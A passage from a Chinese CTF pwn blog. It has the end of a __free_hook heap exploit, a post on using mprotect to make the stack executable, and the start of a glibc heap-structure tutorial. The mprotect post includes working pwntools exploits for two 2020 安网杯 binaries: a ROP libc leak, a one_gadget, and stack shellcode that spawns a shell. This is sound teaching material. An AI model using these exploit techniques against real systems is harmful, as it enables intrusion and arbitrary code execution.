class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;book2_name_addr: &quot;</span>+<span class="built_in">hex</span>(book2_name_addr))</span><br><span class="line"><span class="comment">#0x7ffff7fd2010-0x7ffff7800000</span></span><br><span class="line">libc_base = book2_name_addr - (<span class="number">0x7ffff7fd2010</span>-<span class="number">0x7ffff7800000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">one_gadget = libc_base+<span class="number">0x4525a</span> <span class="comment">#0x4525a 0xef9f4 0xf0897</span></span><br><span class="line">log.success(<span class="string">&quot;free_hook:&quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">&quot;one_gadget:&quot;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">edit_book(<span class="number">1</span>, p64(free_hook))</span><br><span class="line">edit_book(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete_book(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN技巧-mprotect修改内存保护权限</title>
      <link href="/2025/03/03/PWN%E6%8A%80%E5%B7%A7-mprotect%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E4%BF%9D%E6%8A%A4%E6%9D%83%E9%99%90/"/>
      <url>/2025/03/03/PWN%E6%8A%80%E5%B7%A7-mprotect%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E4%BF%9D%E6%8A%A4%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<p>mprotect 函数用于设置一块内存的保护权限（将从 start 开始、长度为 len 的内存的保护属性修改为 prot 指定的值），函数原型如下所示：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure></p><ul><li>prot 的取值如下，通过 <code>|</code> 可以将几个属性结合使用（值相加）：<ul><li><code>PROT_READ</code>：可写，值为 1</li><li><code>PROT_WRITE</code>：可读， 值为 2</li><li><code>PROT_EXEC</code>：可执行，值为 4</li><li><code>PROT_NONE</code>：不允许访问，值为 0</li></ul></li></ul><p>需要注意的是，指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。</p><p>如果执行成功，函数返回 0；如果执行失败，函数返回 -1，并且通过 errno 变量表示具体原因。错误的原因主要有以下几个：</p><ul><li><code>EACCES</code>：该内存不能设置为相应权限。这是可能发生的，比如 mmap(2) 映射一个文件为只读的，接着使用 mprotect() 修改为 PROT_WRITE。</li><li><code>EINVAL</code>：start 不是一个有效指针，指向的不是某个内存页的开头。</li><li><code>ENOMEM</code>：内核内部的结构体无法分配。</li><li><code>ENOMEM</code>：进程的地址空间在区间 [start, start+len] 范围内是无效，或者有一个或多个内存页没有映射。</li></ul><p>当一个进程的内存访问行为违背了内存的保护属性，内核将发出 SIGSEGV（Segmentation fault，段错误）信号，并且终止该进程。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>例题来自 2020 安网杯，pwn1 是相对简单对栈溢出，pwn2 在此基础上增加了 mprotect 的运用，同时还是一个静态编译的程序。<br>先来看 pwn1，这是一个 64 位的动态链接程序，开启了 Partial RELRO 和 NX。系统层面 ASLR 也是开启的。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file pwn1 </span><br><span class="line">pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=f92248c7cd330ab53768c281b50d14b4612259f4, not stripped</span><br><span class="line">$ pwn checksec pwn1</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p><p>主函数 main() 先调用 write() 打印字符串，然后进入存在栈溢出漏洞的 vul() 函数，<code>read(0, &amp;buf, 0x100uLL)</code> 读入最多 0x100 字节到 0x80 大小的缓冲区。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.text:0000000000400587 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0000000000400587 public main</span><br><span class="line">.text:0000000000400587 main proc near</span><br><span class="line">.text:0000000000400587 ; __unwind &#123;</span><br><span class="line">.text:0000000000400587 push    rbp</span><br><span class="line">.text:0000000000400588 mov     rbp, rsp</span><br><span class="line">.text:000000000040058B mov     edx, 9          ; n</span><br><span class="line">.text:0000000000400590 mov     esi, offset aWelcome ; <span class="string">&quot;welcome~\n&quot;</span></span><br><span class="line">.text:0000000000400595 mov     edi, 1          ; fd</span><br><span class="line">.text:000000000040059A call    _write</span><br><span class="line">.text:000000000040059F call    vul</span><br><span class="line">.text:00000000004005A4 mov     eax, 0</span><br><span class="line">.text:00000000004005A9 pop     rbp</span><br><span class="line">.text:00000000004005AA retn</span><br><span class="line">.text:00000000004005AA ; &#125; // starts at 400587</span><br><span class="line">.text:00000000004005AA main endp</span><br><span class="line"></span><br><span class="line">.text:0000000000400566 public vul</span><br><span class="line">.text:0000000000400566 vul proc near</span><br><span class="line">.text:0000000000400566</span><br><span class="line">.text:0000000000400566 buf= byte ptr -80h</span><br><span class="line">.text:0000000000400566</span><br><span class="line">.text:0000000000400566 ; __unwind &#123;</span><br><span class="line">.text:0000000000400566 push    rbp</span><br><span class="line">.text:0000000000400567 mov     rbp, rsp</span><br><span class="line">.text:000000000040056A add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">.text:000000000040056E lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000400572 mov     edx, 100h       ; nbytes</span><br><span class="line">.text:0000000000400577 mov     rsi, rax        ; buf</span><br><span class="line">.text:000000000040057A mov     edi, 0          ; fd</span><br><span class="line">.text:000000000040057F call    _read</span><br><span class="line">.text:0000000000400584 nop</span><br><span class="line">.text:0000000000400585 leave</span><br><span class="line">.text:0000000000400586 retn</span><br><span class="line">.text:0000000000400586 ; &#125; // starts at 400566</span><br><span class="line">.text:0000000000400586 vul endp</span><br></pre></td></tr></table></figure><p>总体思路就是栈溢出控制返回地址，执行 one-gadget。因此，我们还需要泄漏 libc 地址，程序里有 write() 函数可以利用。exp 如下所示：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400611</span></span><br><span class="line">pop_rdi = <span class="number">0x400613</span></span><br><span class="line">write = <span class="number">0x400595</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x88</span> + p64(pop_rsi_r15) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>])*<span class="number">2</span> + p64(write)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;welcome~\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">one_gadget = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + <span class="number">0x4527a</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x88</span> + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p><blockquote><p>经测试，one-gadget在本题中并不通用，建议自行构造ROP链</p></blockquote><p>pwn2 是一个 64 位的静态链接程序，开启了 Partial RELRO 和 NX。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file pwn2 </span><br><span class="line">pwn2: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=a3abf349ced6dccd645f0a95d9d47e8ac1217e3e, not stripped</span><br><span class="line">$ pwn checksec pwn2 </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>由于静态链接程序的执行不再需要 libc，因此 ret2libc 类型的攻击手段就失效了，需要考虑注入 shellcode，但是又开启了 NX 保护，这时就需要使用本节所讲的 mprotect() 函数修改栈的可执行权限。</p><p>可以在程序里找到关键函数 _dl_make_stack_executable()，该函数内部调用了 <code>mprotect(v3, dl_pagesize, (unsigned int)_stack_prot)</code>：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -s pwn2 | grep <span class="built_in">exec</span></span><br><span class="line">   635: 0000000000499f70  2296 FUNC    LOCAL  DEFAULT    6 execute_cfa_program</span><br><span class="line">   639: 000000000049af40  2094 FUNC    LOCAL  DEFAULT    6 execute_stack_op</span><br><span class="line">   821: 0000000000474730    92 FUNC    GLOBAL DEFAULT    6 _dl_make_stack_executable</span><br><span class="line">  1831: 00000000006cb168     8 OBJECT  GLOBAL DEFAULT   25 _dl_make_stack_executable</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unsigned int __fastcall dl_make_stack_executable(_QWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // rdx</span><br><span class="line">  _QWORD *v2; // rax</span><br><span class="line">  signed __int64 v3; // rdi</span><br><span class="line">  _QWORD *v4; // rbx</span><br><span class="line">  unsigned int result; // eax</span><br><span class="line"></span><br><span class="line">  v1 = *a1;</span><br><span class="line">  v2 = a1;</span><br><span class="line">  v3 = *a1 &amp; -(signed __int64)dl_pagesize;</span><br><span class="line">  <span class="keyword">if</span> ( v1 != _libc_stack_end )</span><br><span class="line">    <span class="built_in">return</span> 1;</span><br><span class="line">  v4 = v2;</span><br><span class="line">  result = mprotect(v3, dl_pagesize, (unsigned int)_stack_prot);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">return</span> __readfsdword(0xFFFFFFD0);</span><br><span class="line">  *v4 = 0LL;</span><br><span class="line">  dl_stack_flags |= 1u;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造方法是在进入 _dl_make_stack_executable 函数之前，将全局变量 _stack_prot 设置为 7（可读可写可执行），同时将 rdi 设置为全局变量 __libc_stack_end 的值。如下所示：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gef➤  x/gx $rsp-<span class="number">0x10</span></span><br><span class="line"><span class="number">0x7ffef00bbb08</span>:<span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x7ffef00bbb10</span>:<span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x7ffef00bbb18</span>:<span class="number">0x00000000004015e7</span>  <span class="comment"># pop rsi ; ret</span></span><br><span class="line"><span class="number">0x7ffef00bbb20</span>:<span class="number">0x0000000000000007</span>      <span class="comment"># rwx</span></span><br><span class="line"><span class="number">0x7ffef00bbb28</span>:<span class="number">0x00000000004014c6</span>  <span class="comment"># pop rdi ; ret</span></span><br><span class="line"><span class="number">0x7ffef00bbb30</span>:<span class="number">0x00000000006c9fe0</span>      <span class="comment"># __stack_prot</span></span><br><span class="line"><span class="number">0x7ffef00bbb38</span>:<span class="number">0x000000000047a3b2</span>  <span class="comment"># mov [rdi], rsi</span></span><br><span class="line"><span class="number">0x7ffef00bbb40</span>:<span class="number">0x00000000004014c6</span>  <span class="comment"># pop rdi ; ret</span></span><br><span class="line"><span class="number">0x7ffef00bbb48</span>:<span class="number">0x00000000006c9f90</span>      <span class="comment"># __libc_stack_end</span></span><br><span class="line"><span class="number">0x7ffef00bbb50</span>:<span class="number">0x0000000000474730</span>      <span class="comment"># _dl_make_stack_executable</span></span><br><span class="line"><span class="number">0x7ffef00bbb58</span>:<span class="number">0x00000000004009e7</span>      <span class="comment"># vul</span></span><br></pre></td></tr></table></figure><p>调用 mprotect 前：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">     0x474754 &lt;_dl_make_stack_executable+36&gt; add    BYTE PTR [rbx+0x48], dl</span><br><span class="line">     0x474757 &lt;_dl_make_stack_executable+39&gt; mov    ebx, eax</span><br><span class="line"> →   0x474759 &lt;_dl_make_stack_executable+41&gt; call   0x43fd00 &lt;mprotect&gt;</span><br><span class="line">   ↳    0x43fd00 &lt;mprotect+0&gt;     mov    eax, 0xa</span><br><span class="line">        0x43fd05 &lt;mprotect+5&gt;     syscall </span><br><span class="line">        0x43fd07 &lt;mprotect+7&gt;     cmp    rax, 0xfffffffffffff001</span><br><span class="line"></span><br><span class="line">mprotect (</span><br><span class="line">   <span class="variable">$rdi</span> = 0x00007ffef00bb000 → 0x0000000000000000,</span><br><span class="line">   <span class="variable">$rsi</span> = 0x0000000000001000,</span><br><span class="line">   <span class="variable">$rdx</span> = 0x0000000000000007</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">gef➤  vmmap </span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000400000 0x00000000004ca000 0x0000000000000000 r-x /home/firmy/pwn/pwn2/pwn2</span><br><span class="line">0x00000000006c9000 0x00000000006cc000 0x00000000000c9000 rw- /home/firmy/pwn/pwn2/pwn2</span><br><span class="line">0x00000000006cc000 0x00000000006ce000 0x0000000000000000 rw- </span><br><span class="line">0x00000000009b6000 0x00000000009d9000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffef009d000 0x00007ffef00be000 0x0000000000000000 rw- [stack]</span><br><span class="line">0x00007ffef0194000 0x00007ffef0197000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffef0197000 0x00007ffef0199000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br></pre></td></tr></table></figure><p>调用 mprotect 后，可以看到 0x00007ffef00bb000 到 0x00007ffef00bc000 的栈内存已经是 rwx 权限了：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gef➤  vmmap </span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000400000 0x00000000004ca000 0x0000000000000000 r-x /home/firmy/pwn/pwn2/pwn2</span><br><span class="line">0x00000000006c9000 0x00000000006cc000 0x00000000000c9000 rw- /home/firmy/pwn/pwn2/pwn2</span><br><span class="line">0x00000000006cc000 0x00000000006ce000 0x0000000000000000 rw- </span><br><span class="line">0x00000000009b6000 0x00000000009d9000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffef009d000 0x00007ffef00bb000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffef00bb000 0x00007ffef00bc000 0x0000000000000000 rwx [stack]</span><br><span class="line">0x00007ffef00bc000 0x00007ffef00be000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffef0194000 0x00007ffef0197000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffef0197000 0x00007ffef0199000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br></pre></td></tr></table></figure><p>接下来程序跳到 vul 函数，读入 shellcode 到栈上并执行，即可获得 shell。exp 如下所示：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vul = <span class="number">0x4009E7</span></span><br><span class="line">write = <span class="number">0x4009DD</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4014c6</span></span><br><span class="line">pop_rsi = <span class="number">0x4015e7</span></span><br><span class="line">pop_rdx = <span class="number">0x442626</span></span><br><span class="line">jmp_rsi = <span class="number">0x4a3313</span></span><br><span class="line">mov_rdi_esi = <span class="number">0x47a3b3</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&quot;A&quot;</span>*<span class="number">0x88</span></span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">7</span>) + p64(pop_rdi) + p64(elf.sym[<span class="string">&#x27;__stack_prot&#x27;</span>]) + p64(mov_rdi_esi)</span><br><span class="line">payload += p64(pop_rdi) + p64(elf.sym[<span class="string">&#x27;__libc_stack_end&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;_dl_make_stack_executable&#x27;</span>])</span><br><span class="line">payload += p64(vul)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;welcome~\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x88</span>, <span class="string">&quot;A&quot;</span>) + p64(jmp_rsi)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> PWN技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆相关整理</title>
      <link href="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/"/>
      <url>/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="What-is-堆？"><a href="#What-is-堆？" class="headerlink" title="What is 堆？"></a>What is 堆？</h2><p>明确一下堆的概念，堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。在 CTF 的 pwn 程序中，栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。</p><ul><li>windows 和 linux 下的堆分配、管理方式都不同，<strong>这里主要讲到的是 CTF 中常出现的 linux 下的堆分配知识</strong><br>先看看堆在虚拟内存中的位置<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225175129.png" alt="Pasted image 20250225175129"></li><li><strong>堆的生长方向是从低地址向高地址生长的，而栈是从高地址向低地址生长的。</strong><br>实际上堆可以申请到的内存空间比栈要大很多，在 linux 的 4G 的虚拟内存空间里最高可以达到 2.9 G 的空间<blockquote><p>对堆操作的<strong>是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p></blockquote></li></ul><p>下面的分析都是以 <strong>glibc 库下的 ptmalloc2 堆管理器</strong>来讲解的。</p><h2 id="一、堆的基本结构"><a href="#一、堆的基本结构" class="headerlink" title="一、堆的基本结构"></a>一、堆的基本结构</h2><p>先简单的画一个图吧：<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225175239.png" alt="Pasted image 20250225175239"></p><h3 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h3><p><code>malloc_chunk</code>的结构</p><h4 id="malloc-chunk结构"><a href="#malloc-chunk结构" class="headerlink" title="malloc_chunk结构"></a>malloc_chunk结构</h4><p>每个程序分配的内存（这里指的是malloc函数）在内部被一个叫做”<strong>堆块</strong>”的所替代。<strong>一个堆块是由元数据和程序返回的内存组成的（实际上内存是malloc的返回值）</strong>。所有的这些堆块都是保存在堆上，这块内存区域在申请新的内存时会不断的扩大。同样，当一定数量的内存释放时，堆可以收缩。在glibc源码中定义的堆块如下：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>假设内存中没有堆块释放，新分配的内存区域紧随之前申请的堆块后。因此如果一个程序依次调用malloc(256),malloc(512),以及malloc(1024), 内存布局如下:<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225200003.png" alt="Pasted image 20250225200003"><br>在堆块之间的”.”是虚拟的边界，实际当中他们是彼此相邻的。你可能会问，为何我要在布局当中包含一个”顶块”元数据（top chunk）。<strong>顶级块表示堆中可利用的内存，而且是唯一的可以大小可以生长的堆块</strong>。当申请新的内存时，顶块分成两个部分：第一个部分变成所申请的堆块，第二个部分变为新的顶块（因此顶块大小可以收缩）。如果顶块不能够满足申请的内存区域大小，程序就会要求操作系统扩大顶块（让堆继续生长）。被释放的chunk被记录在链表中（可能是循环双向链表，也可能是单向链表)。具体结构如下<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225200210.png" alt="Pasted image 20250225200210"><br>一般情况下，物理相邻的两个空闲chunk会被合并为一个chunk。堆管理器会通过prev_size字段以及size字段合并两个物理相邻的空闲chunk块。</p><h4 id="1-pre-size字段"><a href="#1-pre-size字段" class="headerlink" title="1. pre size字段"></a>1. pre size字段</h4><blockquote><p>全称previous size</p></blockquote><p>  如果该 chunk 的物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）是<strong>空闲</strong>的话，<strong>那该字段记录的是前一个 chunk 的*</strong>大小<strong>* (</strong>包括 chunk 头<strong>)。否则，</strong>该字段可以用来存储物理相邻的前一个 chunk 的数据<strong>。这里的前一 chunk 指的是较低地址的 chunk。</strong>前面一个堆块在使用时并且pre_size为储存前面chunk的数据时，它的值始终为0**</p><h4 id="2-size-字段"><a href="#2-size-字段" class="headerlink" title="2. size 字段"></a>2. size 字段</h4><p><strong>用来指示当前堆块的大小的（头部加上（pre_size+size） +user data 的大小）</strong>。<br>大小必须是 2 <em> SIZE_SZ 的整数倍。如果申请的内存大小不是 2 </em> SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 <em> SIZE_SZ 的倍数。<br><strong>32 位系统中，SIZE_SZ 是 4；</strong><br><strong>64 位系统中，SIZE_SZ 是 8。</strong> </em>该字段的低三个比特位对 chunk 的大小没有影响<em>，它们从高到低分别表示<br>但是这个字段的最后<em>*三位</em></em>相当于三个 flag ，这三位的作用分别是：</p><ol><li><code>NON_MAIN_ARENA</code>，记录当前 chunk 是否不属于<strong>主分配区（主线程）</strong>，1 表示不属于（是非主分配区/非主线程），0 表示属于。</li><li><code>IS_MAPPED</code>，表示当前chunk是从哪个内存区域获得的虚拟内存。为1表示该chunk是从<strong>mmap</strong>映射区域分配的，否则是从<strong>heap</strong>区域分配的</li><li><code>PREV_INUSE</code>，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225180103.png" alt="Pasted image 20250225180103"><br>这里重点讲解最后一位：<strong>用来记录前一个 chunk 块是否被分配，被分配的话这个字段的值为 1</strong>，所以经常会在已分配的堆块中的 size 字段中发现值比原来大 1 个字节。<blockquote><p>所以前一个堆块的释放与否都和这两个字段（pre_size、size）的值有关，这是因为便于内存的释放操作（free）</p></blockquote></li></ol><h4 id="3-user-data"><a href="#3-user-data" class="headerlink" title="3. user data"></a>3. user data</h4><p>顾名思义就是用来存放用户数据的。<br>使用malloc函数分配到的内存的返回值指针是<strong>指向userdata（用户数据区）</strong><br>例如在 64 位程序中：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><br>申请到的堆块总大小为<code>16 + 8 + 8 + 1 = 0x21(byte)</code></p><ol><li>第一个16字节是系统最小分配的内存，也就是说你如果想要申请的内存小于系统最小分配的内存的话，就会按照最小的内存来分配。</li></ol><ul><li>在64位系统中这个值是16个字节，在32位系统中是8个字节</li><li>例如，如果代码中是malloc(0)的话，堆管理器也会分配最小内存空间给你</li></ul><ol><li>第二个8字节是pre size字段的大小(32位的为4字节)</li><li>第三个8字节为 size字段的大小（32位的为4字节)</li><li>最后一个1字节是<strong>PREV_INUSE的值，只有0或1两个值</strong></li></ol><blockquote><p>整理一下：<strong>堆的基本结构包括pre_size、size、userdata</strong><br><strong>size字段包括</strong>:头部(pre size+size)加上 user data 的大小<br>malloc出最小大小为：系统最小分配内存+pre_size字段+size字段+prev_inuse(此处存疑）</p></blockquote><h3 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h3><h4 id="使用中（分配后）"><a href="#使用中（分配后）" class="headerlink" title="使用中（分配后）"></a>使用中（分配后）</h4><p>如图</p><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226142821.png" alt="Pasted image 20250226142821"></p><h4 id="空闲中（释放后）"><a href="#空闲中（释放后）" class="headerlink" title="空闲中（释放后）"></a>空闲中（释放后）</h4><p>如图</p><ol><li>空闲中的chunk不存在M状态，只有A|P状态</li><li><strong>user data头部</strong>被分配出两个成员，fd和bk<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226153753.png" alt="Pasted image 20250226153753"><br><code>fd</code>，<code>bk</code>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下</li></ol><ul><li><code>fd</code> 指向前一个（非物理相邻）空闲的 chunk 的起始地址，32位占4字节，64位占8字节</li><li><code>bk</code> 指向后一个（非物理相邻）空闲的 chunk 的起始地址，32位占4字节，64位占8字节</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li></ul><blockquote><p>事实上，释放后的<strong>large block</strong>中还存在另外两个成员：<strong>fd_nextsize</strong>和<strong>bk_nextsize</strong></p></blockquote><p><code>fd_nextsize</code>， <code>bk_nextsize</code>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</p><ul><li><strong>fd_nextsize</strong> 指向前一个与当前 chunk 大小不同的第一个空闲块，<strong>不包含 bin 的头指针</strong>。</li><li><strong>bk_nextsize</strong> 指向后一个与当前 chunk 大小不同的第一个空闲块，<strong>不包含 bin 的头指针</strong>。  <blockquote><p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。</p></blockquote></li></ul><h3 id="堆块大小"><a href="#堆块大小" class="headerlink" title="堆块大小"></a>堆块大小</h3><ul><li><p>32位程序：</p><ol><li>用户分配到的最小堆块大小为<code>17B</code>：<strong>prev_size(4B) + size(4B) + fd(4B) + bk(4B) + 